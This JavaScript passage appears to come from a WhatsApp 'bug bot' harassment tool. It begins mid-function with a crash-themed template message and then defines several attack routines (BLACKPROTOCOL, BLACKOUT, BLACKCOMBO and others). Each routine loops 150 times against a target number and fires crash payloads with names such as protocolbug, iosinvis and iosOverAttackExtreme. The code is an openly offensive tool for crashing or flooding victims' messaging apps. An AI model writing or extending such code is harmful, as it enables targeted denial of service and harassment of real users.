    await sock.relayMessage(jid, {
      templateMessage: {
        hydratedTemplate: {
          hydratedContentText: `⚠️ SYSTEM BROKEN\n${payload}`,
          hydratedButtons: Array.from({ length: 3 }).map((_, index) => ({
            quickReplyButton: {
              displayText: `💥 Boom ${index + 1}`,
              id: `crash_${index + 1}`
            }
          }))
        }
      }
    }, Ptcp);
  }
}

async function BLACKPROTOCOL(sock, jid) {
  if (!sock.user) throw new Error("Bot tidak aktif.");
  console.log(chalk.green(`ブラック・プロトコル を起動する ${jid}`));
  for (let i = 1; i <= 150; i++) {
    if (!sock.user) break;
    console.log(chalk.red(`ブラック・プロトコル (🦠) を送信しています ${jid}`));
    await safeExec("protocolbug7", () => protocolbug7(sock, jid, true));
    await safeExec("protocolbug0", () => protocolbug0(sock, jid, true));
    await safeExec("protocolbug8", () => protocolbug8(sock, jid, true));
    await safeExec("protocolbug3", () => protocolbug3(sock, jid, true));
    await safeExec("protocolbug9", () => protocolbug9(sock, jid, true));
    await safeExec("DevilsProtocolV2", () => DevilsProtocolV2(sock, jid, true));
    await sleep(400);
  }
}
async function BLACKINVIS(sock, jid) {
  if (!sock.user) throw new Error("Bot tidak aktif.");
  console.log(chalk.green(`開始黒は見えない ${jid}`));
  for (let i = 1; i <= 150; i++) {
    if (!sock.user) break;
    console.log(chalk.red(`ブラックインビジブル（🦠）を送信します ${jid}`));
    await safeExec("overbutton", () => overbutton(sock, jid, true));
    await safeExec("carouselfriX", () => carouselfriX(sock, jid, true));
    await safeExec("iosinvis", () => iosinvis(sock, jid));
    await safeExec("TagMsgPayment", () => TagMsgPayment(sock, jid));
    // ... kode lainnya
    await sleep(400); // Mengubah delay menjadi sleep
    // ... kode lainnya
  }
}
async function BLACKOUT(sock, jid) {
  if (!sock.user) throw new Error("Bot tidak aktif.");
  console.log(chalk.green(`ブラック・プロトコルを開始する ${jid}`));
  for (let i = 1; i <= 150; i++) {
    if (!sock.user) break;
    console.log(chalk.red(`ブラックプロトコル（🦠）を送信 ${jid}`));
    await safeExec("protocolbug7", () => protocolbug7(sock, jid, true));
    await safeExec("protocolbug0", () => protocolbug0(sock, jid, true));
    await safeExec("protocolbug8", () => protocolbug8(sock, jid, true));
    await safeExec("protocolbug3", () => protocolbug3(sock, jid, true));
    await safeExec("protocolbug9", () => protocolbug9(sock, jid, true));
    await safeExec("DevilsProtocolV2", () => DevilsProtocolV2(sock, jid, true));
    await safeExec("overbutton", () => overbutton(sock, jid, true));
    await safeExec("carouselfriX", () => carouselfriX(sock, jid, true));
    await safeExec("iosinvis", () => iosinvis(sock, jid));
    await safeExec("TagMsgPayment", () => TagMsgPayment(sock, jid));
    await safeExec("FolwareFunction2", () => FolwareFunction2(sock, jid, true));
    await safeExec("stunnerBugMP4", () => stunnerBugMP4(sock, jid));
    await sleep(400); // Mengubah delay menjadi sleep
    // ... kode lainnya
  }
}
async function BLACKCOMBO(sock, jid) {
  if (!sock.user) throw new Error("Bot tidak aktif.");
  console.log(chalk.green(`スターティングブラックプロトコル ${jid}`));
  for (let i = 1; i <= 150; i++) {
    if (!sock.user) break;
    console.log(chalk.red(`ブラックコンボ(🦠) を送信しています ${jid}`));
    await safeExec("protocolbug7", () => protocolbug7(sock, jid, true));
    await safeExec("protocolbug0", () => protocolbug0(sock, jid, true));
    await safeExec("protocolbug8", () => protocolbug8(sock, jid, true));
    await safeExec("protocolbug3", () => protocolbug3(sock, jid, true));
    await safeExec("protocolbug9", () => protocolbug9(sock, jid, true));
    await safeExec("DevilsProtocolV2", () => DevilsProtocolV2(sock, jid, true));
    await safeExec("overbutton", () => overbutton(sock, jid, true));
    await safeExec("carouselfriX", () => carouselfriX(sock, jid, true));
    await safeExec("iosinvis", () => iosinvis(sock, jid));
    await safeExec("TagMsgPayment", () => TagMsgPayment(sock, jid));
    await safeExec("FolwareFunction2", () => FolwareFunction2(sock, jid, true));
    await safeExec("stunnerBugMP4", () => stunnerBugMP4(sock, jid));
    await safeExec("protocolbug7", () => protocolbug7(sock, jid, true));
    await safeExec("protocolbug0", () => protocolbug0(sock, jid, true));
    await safeExec("protocolbug8", () => protocolbug8(sock, jid, true));
    await safeExec("protocolbug3", () => protocolbug3(sock, jid, true));
    await safeExec("protocolbug9", () => protocolbug9(sock, jid, true));
    await safeExec("DevilsProtocolV2", () => DevilsProtocolV2(sock, jid, true));
    await safeExec("overbutton", () => overbutton(sock, jid, true));
    await safeExec("carouselfriX", () => carouselfriX(sock, jid, true));
    await safeExec("iosinvis", () => iosinvis(sock, jid));
    await safeExec("TagMsgPayment", () => TagMsgPayment(sock, jid));
    await safeExec("FolwareFunction2", () => FolwareFunction2(sock, jid, true));
    await safeExec("stunnerBugMP4", () => stunnerBugMP4(sock, jid));
    await sleep(400);
  }
}
async function BLACKRR(sock, jid) {
  if (!sock.user) throw new Error("Bot tidak aktif.");
  console.log(chalk.green(`開始黒は見えない ${jid}`));
  for (let i = 1; i <= 150; i++) {
    if (!sock.user) break;
    console.log(chalk.red(`ブラックインビジブル（🦠）を送信します ${jid}`));
    await safeExec("overbutton", () => overbutton(sock, jid, true));
    await safeExec("carouselfriX", () => carouselfriX(sock, jid, true));
    await safeExec("iosinvis", () => iosinvis(sock, jid));
    await safeExec("TagMsgPayment", () => TagMsgPayment(sock, jid));
    await safeExec("FCDELAYB", () => FCDELAYB(sock, jid, true));
    await safeExec("iosOverAttackExtreme", () => iosOverAttackExtreme(sock, jid));
    // ... kode lainnya
    await sleep(400); // Mengubah delay menjadi sleep
    // ... kode lainnya
  }
}
